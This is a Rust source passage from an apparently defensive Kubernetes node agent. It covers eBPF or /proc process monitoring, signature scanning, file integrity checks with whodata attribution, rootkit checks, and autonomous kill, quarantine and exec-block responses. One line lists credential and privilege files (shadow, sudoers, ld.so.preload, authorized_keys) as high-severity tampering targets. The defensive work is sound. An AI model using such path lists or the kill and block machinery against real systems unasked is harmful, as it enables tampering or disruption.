//! The node agent: process events from eBPF or `/proc`, behavior rules,
//! file scanning, integrity monitoring, and autonomous response.

mod behavior;
#[cfg(any(target_os = "linux", test))]
mod btf;
mod client;
#[cfg(target_os = "linux")]
mod ebpf;
mod events;
mod integrity;
mod metrics;
mod pods;
mod process;
mod procfs;
#[cfg(target_os = "linux")]
mod realtime;
mod report;
mod response;
mod rootcheck;
mod scanner;
mod store;
#[cfg(any(target_os = "linux", test))]
mod tracefs;
mod whodata;

use std::collections::{HashMap, HashSet};
use std::fmt::Write as _;
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::atomic::AtomicBool;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use anyhow::Context as _;
use chrono::Utc;
use prometheus_client::registry::Registry;
use tokio::sync::{mpsc, watch};

use crate::feed::oci::{Registry as OciRegistry, credentials};
use crate::k8s::{AgentStatus, Events, apply_lease};
use crate::observability::{Health, router, serve};
use crate::policy::{
    Detection, Engine as Kind, FileInfo, POLICY_FILE, Policy, Response, Severity, Workload,
};
use crate::rollout::{ROLLOUT_FILE, Rollout};

use self::events::{Exec, ProcessEvent};
use self::metrics::AgentMetrics;
use self::process::{Proc, ProcessTable};
use self::procfs::ProcFs;
use self::report::{Counters, Sinks};
use self::response::Blocker;
use self::scanner::{Finding, ScanCache, ScanRoot, kernel_dev};
use self::store::{ContentStore, Fetch};
use self::whodata::InodeWatch;

#[derive(Clone, Debug)]
pub struct AgentArgs {
    pub node: String,
    pub namespace: String,
    pub instance: String,
    pub policy_dir: PathBuf,
    pub rollout_dir: PathBuf,
    pub state_dir: PathBuf,
    pub proc_root: PathBuf,
    pub manager_url: Option<String>,
    pub tls_dir: PathBuf,
    pub manager_token_file: PathBuf,
    pub registry_auth: Option<PathBuf>,
    pub health_addr: SocketAddr,
    pub tracefs: PathBuf,
    pub btf: PathBuf,
}

const RELOAD_EVERY: Duration = Duration::from_secs(10);
const LEASE_EVERY: Duration = Duration::from_secs(30);
const FIRST_FULL_SCAN: Duration = Duration::from_mins(2);

fn read_json<T: serde::de::DeserializeOwned + Default>(path: &Path) -> T {
    std::fs::read(path)
        .ok()
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_default()
}

/// Shared state of the event handlers.
struct Ctx {
    node: String,
    proc: ProcFs,
    state: PathBuf,
    policy: watch::Receiver<Policy>,
    store: Arc<ContentStore>,
    table: Mutex<ProcessTable>,
    pods: pods::PodIndex,
    blocker: Option<Arc<dyn Blocker>>,
    /// The whodata hooks' inode set, when they are attached.
    inodes: Option<Arc<dyn InodeWatch>>,
    whodata: Mutex<whodata::Whodata>,
    /// When the last integrity check started. Whodata actors from before
    /// it are not attributed to the changes of the next one.
    integrity_since: Mutex<Option<std::time::Instant>>,
    cache: Mutex<ScanCache>,
    own: Mutex<HashSet<i32>>,
    metrics: AgentMetrics,
    tx: mpsc::Sender<(Detection, String)>,
}

impl Ctx {
    fn policy(&self) -> Policy {
        self.policy.borrow().clone()
    }

    fn content(&self) -> String {
        self.store.active().unwrap_or_else(|| "builtin".into())
    }

    async fn emit(&self, d: Detection) {
        let _ = self.tx.send((d, self.content())).await;
    }

    fn workload(&self, container_id: &str) -> Workload {
        self.pods.lookup(container_id).unwrap_or_else(|| Workload {
            container_id: container_id.to_string(),
            ..Workload::default()
        })
    }

    /// The agent's own processes and excluded namespaces are skipped by
    /// every engine. Neither can be changed from inside a container.
    fn excluded(&self, p: &Proc, w: Option<&Workload>, policy: &Policy) -> bool {
        self.own
            .lock()
            .is_ok_and(|o| o.contains(&p.pid) || o.contains(&p.ppid))
            || w.is_some_and(|w| !w.namespace.is_empty() && policy.namespace_excluded(&w.namespace))
    }

    fn kill_tree(&self, pid: i32, descendants: bool, d: &mut Detection) {
        let mut pids = vec![pid];
        if descendants && let Ok(t) = self.table.lock() {
            pids.extend(t.descendants(pid));
        }
        let mut errors = Vec::new();
        for p in pids {
            if let Err(e) = response::kill(p) {
                errors.push(e);
            }
        }
        d.actions.push(Response::Kill);
        if !errors.is_empty() {
            let mut all: Vec<String> = d.action_error.take().into_iter().collect();
            all.extend(errors);
            d.action_error = Some(all.join("; "));
        }
    }

    fn quarantine_and_block(
        &self,
        f: &Finding,
        kernel_inode: Option<(u64, u64)>,
        d: &mut Detection,
    ) {
        let mut errors: Vec<String> = d.action_error.take().into_iter().collect();
        match response::quarantine(&f.root, &f.file.path, f.inode, &self.state, &f.found.sha256) {
            Ok(_) => d.actions.push(Response::Quarantine),
            Err(e) => errors.push(e),
        }
        if let Some(b) = &self.blocker {
            let (dev, ino) = kernel_inode.unwrap_or_else(|| (kernel_dev(f.inode.0), f.inode.1));
            match b.block(dev, ino) {
                Ok(()) => {
                    d.actions.push(Response::Block);
                    #[allow(clippy::cast_possible_wrap)]
                    self.metrics.blocklist_entries.set(b.entries() as i64);
                }
                Err(e) => errors.push(e),
            }
        }
        if !errors.is_empty() {
            d.action_error = Some(errors.join("; "));
        }
    }

    fn proc_from_exec(&self, e: &Exec) -> Proc {
        let stat = self.proc.stat(e.pid);
        Proc {
            pid: e.pid,
            ppid: e
                .ppid
                .or_else(|| stat.as_ref().map(|s| s.ppid))
                .unwrap_or(0),
            comm: if e.comm.is_empty() {
                stat.map(|s| s.comm).unwrap_or_default()
            } else {
                e.comm.clone()
            },
            exe: self
                .proc
                .exe(e.pid)
                .or_else(|| (!e.filename.is_empty()).then(|| e.filename.clone())),
            cmdline: e.args.clone().unwrap_or_else(|| self.proc.cmdline(e.pid)),
            uid: e.uid.or_else(|| self.proc.uid(e.pid)),
            container_id: self.proc.container_id(e.pid),
        }
    }

    async fn on_exec(self: &Arc<Self>, e: Exec) {
        let p = self.proc_from_exec(&e);
        let parent = self.table.lock().ok().and_then(|t| t.get(p.ppid).cloned());
        if let Ok(mut t) = self.table.lock() {
            t.insert(p.clone());
        }
        let policy = self.policy();
        let workload = p.container_id.as_deref().map(|id| self.workload(id));
        if self.excluded(&p, workload.as_ref(), &policy) {
            return;
        }
        let info = self.table.lock().ok().and_then(|t| t.info(p.pid));

        let killed = policy.scan.on_exec
            && self
                .scan_exec(&e, &p, info.clone(), workload.clone(), &policy)
                .await;
        if policy.behavior.enabled && !policy.process_excluded(p.exe.as_deref()) {
            let socket = self.proc.stdio_socket(p.pid);
            for hit in
                behavior::on_exec(&p, parent.as_ref(), socket, &policy.behavior.disabled_rules)
            {
                let mut d = Detection::new(
                    &self.node,
                    Kind::Behavior,
                    hit.rule.id(),
                    hit.severity,
                    hit.description,
                );
                d.process.clone_from(&info);
                d.workload.clone_from(&workload);
                if policy.protect() && hit.severity >= Severity::High && !killed {
                    self.kill_tree(p.pid, hit.severity == Severity::Critical, &mut d);
                }
                self.emit(d).await;
            }
        }
    }

    /// Scans the executable, and the script when the exec ran one through
    /// an interpreter. The quarantine happens before the kill, while
    /// `/proc/<pid>/root` still resolves. Returns whether it killed.
    async fn scan_exec(
        self: &Arc<Self>,
        e: &Exec,
        p: &Proc,
        info: Option<crate::policy::ProcessInfo>,
        workload: Option<Workload>,
        policy: &Policy,
    ) -> bool {
        // The executable through the kernel's /proc/<pid>/exe link. A script
        // run by an interpreter is opened inside the container's root, never
        // by a host path, so a symlink cannot steer the agent outside it.
        let mut targets = vec![(None, p.exe.clone(), true)];
        if !e.filename.is_empty() && Some(&e.filename) != p.exe.as_ref() {
            let script = if e.filename.starts_with('/') {
                e.filename.clone()
            } else {
                let cwd = std::fs::read_link(self.proc.root_path(p.pid).with_file_name("cwd"))
                    .map(|c| c.to_string_lossy().into_owned())
                    .unwrap_or_default();
                format!("{}/{}", cwd.trim_end_matches('/'), e.filename)
            };
            targets.push((Some(script.clone()), Some(script), false));
        }
        for (script, shown, is_exe) in targets {
            let ctx = self.clone();
            let max = policy.scan.max_file_size_bytes;
            let pid = p.pid;
            let found = tokio::task::spawn_blocking(move || {
                let engine = ctx.store.engine();
                let mut scanner = engine.scanner();
                ctx.metrics.scanned("exec");
                let (file, path) = match &script {
                    None => {
                        let path = ctx.proc.exe_path(pid);
                        (std::fs::File::open(&path).ok()?, path)
                    }
                    Some(s) => (
                        response::open_in_root(&ctx.proc.root_path(pid), s).ok()?,
                        std::path::PathBuf::from(s),
                    ),
                };
                scanner::scan_file(&mut scanner, &engine.revision, &ctx.cache, file, &path, max)
            })
            .await
            .ok()
            .flatten();
            let Some((m, mut file, inode)) = found else {
                continue;
            };
            file.path = shown.unwrap_or(file.path);
            let mut d = Detection::new(
                &self.node,
                Kind::Signature,
                &m.name,
                m.severity,
                m.description.clone(),
            );
            d.process.clone_from(&info);
            d.workload.clone_from(&workload);
            d.file = Some(file.clone());
            let protect = policy.protect() && m.severity >= Severity::High;
            if protect {
                let finding = Finding {
                    found: m,
                    file,
                    root: self.proc.root_path(p.pid),
                    workload: workload.clone(),
                    inode,
                };
                let kernel = (is_exe && e.dev != 0).then_some((e.dev, e.ino));
                self.quarantine_and_block(&finding, kernel, &mut d);
                self.kill_tree(p.pid, false, &mut d);
            }
            self.emit(d).await;
            return protect;
        }
        false
    }

    async fn on_connect(&self, pid: i32, addr: std::net::IpAddr, port: u16) {
        let policy = self.policy();
        if !policy.behavior.enabled {
            return;
        }
        let p = self.table.lock().ok().and_then(|t| t.get(pid).cloned());
        let p = p.unwrap_or_else(|| {
            self.proc_from_exec(&Exec {
                pid,
                ..Exec::default()
            })
        });
        let workload = p.container_id.as_deref().map(|id| self.workload(id));
        if self.excluded(&p, workload.as_ref(), &policy)
            || policy.process_excluded(p.exe.as_deref())
        {
            return;
        }
        let socket = self.proc.stdio_socket(pid);
        let target = SocketAddr::new(addr, port).to_string();
        for hit in behavior::on_connect(&p, socket, &target, &policy.behavior.disabled_rules) {
            let mut d = Detection::new(
                &self.node,
                Kind::Behavior,
                hit.rule.id(),
                hit.severity,
                hit.description,
            );
            d.process = self.table.lock().ok().and_then(|t| t.info(pid));
            d.workload.clone_from(&workload);
            if policy.protect() && hit.severity >= Severity::High {
                self.kill_tree(pid, hit.severity == Severity::Critical, &mut d);
            }
            self.emit(d).await;
        }
    }

    async fn on_blocked(&self, pid: i32, comm: String, denied: bool) {
        let container = self.proc.container_id(pid);
        let mut d = Detection::new(
            &self.node,
            Kind::Signature,
            "exec-blocked",
            Severity::High,
            format!("{comm} tried to execute a blocklisted file"),
        );
        d.process = Some(crate::policy::ProcessInfo {
            pid,
            comm,
            cmdline: self.proc.cmdline(pid),
            ..Default::default()
        });
        d.workload = container.as_deref().map(|id| self.workload(id));
        d.actions = if denied {
            vec![Response::Block]
        } else {
            vec![Response::Alert]
        };
        self.emit(d).await;
    }

    async fn handle(self: &Arc<Self>, ev: ProcessEvent) {
        self.metrics.event(ev.kind());
        match ev {
            ProcessEvent::Exec(e) => self.on_exec(e).await,
            ProcessEvent::Exit { pid } => {
                if let Ok(mut t) = self.table.lock() {
                    t.remove(pid);
                }
            }
            ProcessEvent::Connect {
                pid, addr, port, ..
            } => self.on_connect(pid, addr, port).await,
            ProcessEvent::Blocked {
                pid, comm, denied, ..
            } => self.on_blocked(pid, comm, denied).await,
            ProcessEvent::Fim(f) => self.on_fim(&f),
        }
    }

    /// One root per container seen on the node, plus the host paths.
    fn scan_roots(&self, policy: &Policy) -> Vec<ScanRoot> {
        let mut by_container: HashMap<String, i32> = HashMap::new();
        if let Ok(t) = self.table.lock() {
            for pid in self.proc.pids() {
                if let Some(id) = t.get(pid).and_then(|p| p.container_id.clone()) {
                    by_container.entry(id).or_insert(pid);
                }
            }
        }
        let mut roots: Vec<ScanRoot> = by_container
            .into_iter()
            .filter_map(|(id, pid)| {
                let w = Some(self.workload(&id));
                if w.as_ref()
                    .is_some_and(|w| policy.namespace_excluded(&w.namespace))
                {
                    return None;
                }
                Some(ScanRoot {
                    base: self.proc.root_path(pid),
                    dirs: vec!["/".into()],
                    workload: w,
                })
            })
            .collect();
        if !policy.scan.host_paths.is_empty() {
            roots.push(ScanRoot {
                base: self.proc.host_root(),
                dirs: policy.scan.host_paths.clone(),
                workload: None,
            });
        }
        roots
    }

    async fn full_scan(self: &Arc<Self>, cancel: Arc<AtomicBool>) {
        let policy = self.policy();
        let roots = self.scan_roots(&policy);
        let ctx = self.clone();
        let p2 = policy.clone();
        let started = std::time::Instant::now();
        let findings = tokio::task::spawn_blocking(move || {
            let engine = ctx.store.engine();
            scanner::full_scan(&engine, &roots, &p2, &ctx.cache, &cancel, &|| {
                ctx.metrics.scanned("full");
            })
        })
        .await
        .unwrap_or_default();
        self.metrics
            .full_scan_duration
            .observe(started.elapsed().as_secs_f64());
        for f in findings {
            let mut d = Detection::new(
                &self.node,
                Kind::Signature,
                &f.found.name,
                f.found.severity,
                f.found.description.clone(),
            );
            d.file = Some(f.file.clone());
            d.workload.clone_from(&f.workload);
            if policy.protect() && f.found.severity >= Severity::High {
                self.quarantine_and_block(&f, None, &mut d);
            }
            self.emit(d).await;
        }
    }

    /// Checks the watched files: every path on the periodic run, only the
    /// `changed` ones on a real-time run. Reports each change with its
    /// changed attributes, a diff of text files, and whodata's actor.
    async fn integrity(
        &self,
        baseline: &mut Option<integrity::Baseline>,
        changed: Option<Vec<String>>,
    ) {
        let policy = self.policy();
        let p = &policy.integrity;
        if !p.enabled {
            return;
        }
        let host = self.proc.host_root();
        let roots = p.paths.clone();
        let limits = integrity_limits(p);
        let realtime = changed.is_some();
        let old = baseline.clone();
        let Ok(now) = tokio::task::spawn_blocking(move || match (&old, changed) {
            (Some(b), Some(c)) => integrity::rescan(&host, &roots, limits, b, &c),
            _ => integrity::snapshot(&host, &roots, limits),
        })
        .await
        else {
            return;
        };
        let started = std::time::Instant::now();
        let since = self
            .integrity_since
            .lock()
            .ok()
            .and_then(|mut s| s.replace(started))
            .unwrap_or_else(|| {
                started
                    .checked_sub(Duration::from_mins(15))
                    .unwrap_or(started)
            });
        let contents = integrity::Contents::new(&self.state);
        let host = self.proc.host_root();
        let keep = |path: &str| {
            let text = (p.report_changes && !integrity::no_diff(&p.no_diff, path))
                .then(|| integrity::Contents::text(&host.join(path.trim_start_matches('/'))))
                .flatten();
            contents.keep(path, text.as_deref());
        };
        if let Some(old) = baseline.as_ref() {
            let run = CheckRun {
                old,
                now: &now,
                contents: &contents,
                realtime,
                since,
            };
            for d in integrity::diff(old, &now) {
                let det = self.integrity_detection(&policy, &d, &run);
                keep(&d.path);
                self.emit(det).await;
            }
        } else {
            for path in now.keys() {
                keep(path);
            }
        }
        if let Err(e) = integrity::save(&self.state, &now) {
            tracing::warn!(error = %e, "save integrity baseline");
        }
        self.watch_inodes(&policy, &now).await;
        *baseline = Some(now);
    }

    fn integrity_detection(
        &self,
        policy: &Policy,
        d: &integrity::Diff,
        run: &CheckRun<'_>,
    ) -> Detection {
        let CheckRun {
            old,
            now,
            contents,
            realtime,
            since,
        } = *run;
        let p = &policy.integrity;
        let path = &d.path;
        let real = self.proc.host_root().join(path.trim_start_matches('/'));
        let severity = if ["shadow", "sudoers", "ld.so.preload", "authorized_keys"]
            .iter()
            .any(|s| path.contains(s))
        {
            Severity::High
        } else {
            Severity::Medium
        };
        let entry = now.get(path).or_else(|| old.get(path));
        let mut changes = crate::policy::FileChanges {
            attributes: d.attributes.iter().map(|a| (*a).to_string()).collect(),
            mode: if realtime { "realtime" } else { "scheduled" }.into(),
            ..Default::default()
        };
        if p.report_changes
            && d.change == integrity::Change::Modified
            && !integrity::no_diff(&p.no_diff, path)
            && let (Some(before), Some(after)) =
                (contents.previous(path), integrity::Contents::text(&real))
        {
            changes.diff = integrity::unified_diff(path, &before, &after);
        }
        let mut description = format!("host file {path} {}", d.change.as_str());
        let mut d_out = Detection::new(
            &self.node,
            Kind::Integrity,
            "file-integrity",
            severity,
            String::new(),
        );
        if p.whodata
            && let Ok(who) = self.whodata.lock()
        {
            let parent = real
                .parent()
                .and_then(|dir| std::fs::metadata(dir).ok())
                .map(|m| {
                    use std::os::unix::fs::MetadataExt as _;
                    (scanner::kernel_dev(m.dev()), m.ino())
                });
            let name = real
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default();
            let by_entry = || parent.and_then(|(dev, ino)| who.entry(dev, ino, &name, since));
            let by_writer = || entry.and_then(|e| who.writer(e.dev, e.ino, since));
            let content = d
                .attributes
                .iter()
                .any(|a| matches!(*a, "sha256" | "size" | "inode"));
            let actor = match d.change {
                integrity::Change::Deleted => by_entry(),
                integrity::Change::Created => by_entry().or_else(by_writer),
                integrity::Change::Modified if content => by_writer().or_else(by_entry),
                integrity::Change::Modified => entry.and_then(|e| who.attrib(e.dev, e.ino, since)),
            };
            if let Some(a) = actor {
                changes.operation = Some(a.op.as_str().into());
                let _ = write!(
                    description,
                    " by {} (pid {}, uid {})",
                    a.process.comm,
                    a.process.pid,
                    a.process
                        .uid
                        .map_or_else(|| "unknown".into(), |u| u.to_string()),
                );
                d_out.process = Some(a.process.clone());
                d_out.workload.clone_from(&a.workload);
            }
        }
        d_out.description = description;
        d_out.file = Some(FileInfo {
            path: path.clone(),
            sha256: now.get(path).and_then(|e| e.sha256.clone()),
            size: now.get(path).map(|e| e.size),
        });
        d_out.changes = Some(changes);
        d_out
    }

    /// Points the whodata hooks at the watched files and directories.
    async fn watch_inodes(&self, policy: &Policy, now: &integrity::Baseline) {
        let Some(inodes) = self.inodes.clone() else {
            return;
        };
        let p = &policy.integrity;
        let (host, roots, limits) = (self.proc.host_root(), p.paths.clone(), integrity_limits(p));
        let (now, on) = (now.clone(), p.enabled && p.whodata);
        let res = tokio::task::spawn_blocking(move || {
            let set = if on {
                integrity::watched_inodes(&host, &roots, limits, &now)
            } else {
                Vec::new()
            };
            inodes.watch(&set)
        })
        .await;
        match res {
            Ok(Ok(n)) => {
                self.metrics
                    .whodata_inodes
                    .set(i64::try_from(n).unwrap_or(i64::MAX));
            }
            Ok(Err(e)) => tracing::warn!(error = %e, "update whodata inodes"),
            Err(e) => tracing::warn!(error = %e, "whodata inode task"),
        }
    }

    /// Records the process behind a write or entry change the FIM hooks saw.
    fn on_fim(&self, f: &events::Fim) {
        if !self.policy().integrity.whodata {
            return;
        }
        let Some(op) = whodata::Op::from_raw(f.op) else {
            return;
        };
        let pid = f.pid;
        let mut process = self
            .table
            .lock()
            .ok()
            .and_then(|t| t.info(pid))
            .unwrap_or_else(|| crate::policy::ProcessInfo {
                pid,
                comm: f.comm.clone(),
                exe: self.proc.exe(pid),
                cmdline: self.proc.cmdline(pid),
                ..Default::default()
            });
        process.uid = Some(f.uid);
        let workload = self.proc.container_id(pid).map(|id| self.workload(&id));
        if let Ok(mut w) = self.whodata.lock() {
            w.record(op, f.dev, f.ino, &f.name, process, workload);
        }
    }

    /// Runs the rootkit anomaly checks and reports findings not reported
    /// since the agent started.
    async fn rootcheck(&self, reported: &mut HashSet<rootcheck::Finding>) {
        if !self.policy().rootcheck.enabled {
            return;
        }
        let proc = self.proc.clone();
        let Ok(findings) = tokio::task::spawn_blocking(move || {
            let host = proc.host_root();
            let listed = proc.pids().into_iter().collect();
            let mut out: Vec<rootcheck::Finding> = rootcheck::hidden_processes(
                &listed,
                proc.pid_max(),
                rootcheck::signal_alive,
                |p| proc.tgid(p),
                || proc.pids().into_iter().collect(),
            )
            .into_iter()
            .map(rootcheck::Finding::HiddenProcess)
            .collect();
            out.extend(rootcheck::dev_anomalies(&host));
            out.extend(rootcheck::temp_setuid(&host));
            out
        })
        .await
        else {
            return;
        };
        for f in findings {
            if !reported.insert(f.clone()) {
                continue;
            }
            let severity = match f {
                rootcheck::Finding::HiddenProcess(_) | rootcheck::Finding::TempSetuid(_) => {
                    Severity::High
                }
                rootcheck::Finding::DevFile(_) | rootcheck::Finding::DevHidden(_) => {
                    Severity::Medium
                }
            };
            let mut d =
                Detection::new(&self.node, Kind::Rootcheck, f.rule(), severity, f.message());
            if let rootcheck::Finding::HiddenProcess(pid) = f {
                d.process = Some(crate::policy::ProcessInfo {
                    pid,
                    ..crate::policy::ProcessInfo::default()
                });
            }
            d.file = f.path().map(|p| FileInfo {
                path: p.to_string(),
                sha256: None,
                size: None,
            });
            self.emit(d).await;
        }
    }
}

/// One integrity check, as each of its changes is turned into a detection.
#[derive(Clone, Copy)]
struct CheckRun<'a> {
    old: &'a integrity::Baseline,
    now: &'a integrity::Baseline,
    contents: &'a integrity::Contents,
    realtime: bool,
    since: std::time::Instant,
}

/// Changes that arrive within this window after the first are checked
/// together, so an editor's write, rename, and chmod make one report.
const REALTIME_SETTLE: Duration = Duration::from_millis(500);

const fn integrity_limits(p: &crate::policy::IntegrityPolicy) -> integrity::Limits {
    integrity::Limits {
        recursion_level: p.recursion_level as usize,
        file_limit: if p.file_limit == 0 {
            100_000
        } else {
            p.file_limit as usize
        },
    }
}

/// The inotify thread of real-time integrity monitoring, restarted when
/// the watched paths or limits change.
#[derive(Default)]
struct RealtimeWatcher {
    running: Option<(Vec<String>, integrity::Limits, Arc<AtomicBool>)>,
}

impl RealtimeWatcher {
    fn stop(&mut self) {
        if let Some((_, _, stop)) = self.running.take() {
            stop.store(true, std::sync::atomic::Ordering::Relaxed);
        }
    }

    fn sync(
        &mut self,
        host_root: &Path,
        p: &crate::policy::IntegrityPolicy,
        tx: &mpsc::Sender<Vec<String>>,
    ) {
        let want = (p.enabled && p.realtime).then(|| (p.paths.clone(), integrity_limits(p)));
        let same = match (&self.running, &want) {
            (Some((paths, limits, _)), Some((wp, wl))) => paths == wp && limits == wl,
            (None, None) => true,
            _ => false,
        };
        if same {
            return;
        }
        self.stop();
        let Some((paths, limits)) = want else {
            return;
        };
        let stop = Arc::new(AtomicBool::new(false));
        #[cfg(target_os = "linux")]
        {
            let (host, roots, tx, stop) = (
                host_root.to_path_buf(),
                paths.clone(),
                tx.clone(),
                stop.clone(),
            );
            std::thread::spawn(move || {
                if let Err(e) = realtime::watch(&host, &roots, limits, &tx, &stop) {
                    tracing::warn!(error = %e, "real-time integrity monitoring stopped, the periodic check continues");
                }
            });
        }
        #[cfg(not(target_os = "linux"))]
        let _ = (host_root, tx);
        self.running = Some((paths, limits, stop));
    }
}

/// Polls `/proc` for new and exited processes.
async fn poll_procfs(
    proc: ProcFs,
    tx: mpsc::Sender<ProcessEvent>,
    policy: watch::Receiver<Policy>,
    mut shutdown: watch::Receiver<bool>,
) {
    // The executable each PID ran when last seen. An exec keeps the PID, so
    // a changed executable is reported as a new exec, as in `sh -c 'x; y'`
    // where the shell becomes `y`.
    let mut known: HashMap<i32, Option<String>> = HashMap::new();
    loop {
        let interval = Duration::from_millis(policy.borrow().behavior.poll_interval_ms.max(100));
        let mut now: HashMap<i32, Option<String>> = HashMap::new();
        for pid in proc.pids() {
            let exe = proc.exe(pid);
            let changed = known
                .get(&pid)
                .is_none_or(|before| exe.is_some() && *before != exe);
            if changed {
                let _ = tx
                    .send(ProcessEvent::Exec(Exec {
                        pid,
                        ..Exec::default()
                    }))
                    .await;
            }
            now.insert(pid, exe);
        }
        for pid in known.keys().filter(|p| !now.contains_key(p)) {
            let _ = tx.send(ProcessEvent::Exit { pid: *pid }).await;
        }
        known = now;
        tokio::select! {
            () = tokio::time::sleep(interval) => {}
            _ = shutdown.changed() => return,
        }
    }
}

/// What the event source gives the agent.
struct Source {
    mode: String,
    /// The exec blocker, when the BPF LSM is attached.
    blocker: Option<Arc<dyn Blocker>>,
    /// The whodata hooks, when they are attached.
    inodes: Option<Arc<dyn InodeWatch>>,
}

/// Starts the event source the policy asks for.
fn start_source(
    args: &AgentArgs,
    policy: &watch::Receiver<Policy>,
    tx: mpsc::Sender<ProcessEvent>,
    metrics: &AgentMetrics,
    shutdown: watch::Receiver<bool>,
) -> Source {
    let want = policy.borrow().event_source;
    #[cfg(target_os = "linux")]
    if want != crate::crd::EventSource::Procfs {
        match ebpf::load(&args.btf, &args.tracefs, tx.clone(), metrics.clone()) {
            Ok(k) => {
                let mode = k.mode().to_string();
                tracing::info!(mode, "eBPF probes attached");
                let blocker: Option<Arc<dyn Blocker>> =
                    k.lsm.then(|| k.clone() as Arc<dyn Blocker>);
                let inodes: Option<Arc<dyn InodeWatch>> =
                    k.whodata().then(|| k.clone() as Arc<dyn InodeWatch>);
                tracing::info!(whodata = inodes.is_some(), "integrity whodata hooks");
                std::mem::forget(k);
                return Source {
                    mode,
                    blocker,
                    inodes,
                };
            }
            Err(e) if want == crate::crd::EventSource::Ebpf => {
                tracing::error!(error = %e, "eventSource is Ebpf and the probes failed to load, polling /proc instead");
            }
            Err(e) => tracing::warn!(error = %e, "eBPF unavailable, polling /proc"),
        }
    }
    #[cfg(not(target_os = "linux"))]
    let _ = (&args.btf, &args.tracefs, want, metrics);
    tokio::spawn(poll_procfs(
        ProcFs::new(&args.proc_root),
        tx,
        policy.clone(),
        shutdown,
    ));
    Source {
        mode: "procfs".into(),
        blocker: None,
        inodes: None,
    }
}

/// A manager client for other modules' tests.
#[cfg(test)]
pub fn client_for_tests(url: &str, tls: &Path, token_file: &Path) -> client::ManagerClient {
    client::ManagerClient::new(url, tls, token_file).unwrap()
}

#[allow(clippy::too_many_lines)]
pub async fn run(args: AgentArgs, shutdown: watch::Receiver<bool>) -> anyhow::Result<()> {
    let started = Utc::now();
    let mut registry = Registry::default();
    let metrics = AgentMetrics::register(&mut registry);
    let health = Health::new(registry);
    tokio::spawn(serve(
        args.health_addr,
        router(health.clone()),
        shutdown.clone(),
    ));

    let policy_path = args.policy_dir.join(POLICY_FILE);
    let rollout_path = args.rollout_dir.join(ROLLOUT_FILE);
    let (policy_tx, policy_rx) = watch::channel(read_json::<Policy>(&policy_path));
    let (rollout_tx, mut rollout_rx) = watch::channel(read_json::<Rollout>(&rollout_path));

    let kube = crate::k8s::client().await.ok();
    if kube.is_none() {
        tracing::warn!("no Kubernetes API access, Events, Pod names, and the Lease are off");
    }
    let pods = kube.clone().map_or_else(pods::PodIndex::empty, |c| {
        pods::PodIndex::start(c, &args.node)
    });
    let store = Arc::new(ContentStore::new(&args.state_dir));
    let manager = match &args.manager_url {
        Some(url) => Some(Arc::new(
            client::ManagerClient::new(url, &args.tls_dir, &args.manager_token_file)
                .context("manager TLS")?,
        )),
        None => None,
    };
    let fetch = match &manager {
        Some(m) => Fetch::Manager(m.clone()),
        None => {
            let creds = args.registry_auth.as_ref().and_then(|p| {
                let cfg = std::fs::read(p).ok()?;
                let image = policy_rx.borrow().feed.as_ref()?.image.clone();
                let reference = crate::feed::oci::Reference::parse(&image).ok()?;
                credentials(&cfg, &reference.registry)
            });
            OciRegistry::new(creds).map_or(Fetch::None, Fetch::Registry)
        }
    };
    if let Some(lkg) = store.last_known_good() {
        let p = policy_rx.borrow().clone();
        if let Err(e) = store.sync(Some(&lkg), &p, &Fetch::None).await {
            tracing::warn!(error = %e, "last known good database did not load");
        }
    }

    let (ev_tx, mut ev_rx) = mpsc::channel::<ProcessEvent>(8192);
    let (det_tx, det_rx) = mpsc::channel::<(Detection, String)>(4096);
    let Source {
        mode,
        blocker,
        inodes,
    } = start_source(&args, &policy_rx, ev_tx.clone(), &metrics, shutdown.clone());
    let proc = ProcFs::new(&args.proc_root);
    let own = proc.descendants_of(i32::try_from(std::process::id()).unwrap_or(0));
    let counters = Arc::new(Counters::default());
    let ctx = Arc::new(Ctx {
        node: args.node.clone(),
        proc: proc.clone(),
        state: args.state_dir.clone(),
        policy: policy_rx.clone(),
        store: store.clone(),
        table: Mutex::new(ProcessTable::default()),
        pods,
        blocker: blocker.clone(),
        inodes,
        whodata: Mutex::new(whodata::Whodata::default()),
        integrity_since: Mutex::new(None),
        cache: Mutex::new(ScanCache::default()),
        own: Mutex::new(own),
        metrics: metrics.clone(),
        tx: det_tx,
    });

    tokio::spawn(report::run(
        det_rx,
        Sinks {
            events: kube
                .clone()
                .filter(|_| policy_rx.borrow().emit_events)
                .map(|c| Events::new(c, "ward-agent", Some(args.node.clone()))),
            manager: manager.clone(),
            metrics: metrics.clone(),
            counters: counters.clone(),
        },
        shutdown.clone(),
    ));

    if mode != "procfs" {
        for pid in proc.pids() {
            let _ = ev_tx
                .send(ProcessEvent::Exec(Exec {
                    pid,
                    ..Exec::default()
                }))
                .await;
        }
    }
    let handler = ctx.clone();
    tokio::spawn(async move {
        while let Some(ev) = ev_rx.recv().await {
            handler.handle(ev).await;
        }
    });

    {
        let (ctx, policy_path, rollout_path) =
            (ctx.clone(), policy_path.clone(), rollout_path.clone());
        let mut shutdown = shutdown.clone();
        let blocker = blocker.clone();
        let node = args.node.clone();
        let metrics = metrics.clone();
        let mode = mode.clone();
        tokio::spawn(async move {
            let mut last_policy = String::new();
            loop {
                let p = read_json::<Policy>(&policy_path);
                let r = read_json::<Rollout>(&rollout_path);
                if p.revision() != last_policy {
                    last_policy = p.revision();
                    if let Some(b) = &blocker
                        && let Err(e) = b.set_enforce(p.protect())
                    {
                        tracing::warn!(error = %e, "set exec enforcement");
                    }
                    let _ = policy_tx.send(p.clone());
                }
                rollout_tx.send_if_modified(|cur| {
                    if *cur == r {
                        false
                    } else {
                        *cur = r.clone();
                        true
                    }
                });
                let assigned = r.assigned(&node).cloned();
                match ctx.store.sync(assigned.as_ref(), &p, &fetch).await {
                    Ok(true) => {
                        metrics.swap(true);
                        tracing::info!(revision = %ctx.store.engine().revision, "signature database loaded");
                    }
                    Ok(false) => {}
                    Err(e) => {
                        metrics.swap(false);
                        tracing::warn!(error = %e, "signature database rejected, keeping the running one");
                    }
                }
                metrics.content(&ctx.store.engine().revision, &mode);
                tokio::select! {
                    () = tokio::time::sleep(RELOAD_EVERY) => {}
                    _ = rollout_rx.changed() => {}
                    _ = shutdown.changed() => return,
                }
            }
        });
    }

    {
        let ctx = ctx.clone();
        let mut shutdown = shutdown.clone();
        tokio::spawn(async move {
            tokio::time::sleep(FIRST_FULL_SCAN).await;
            loop {
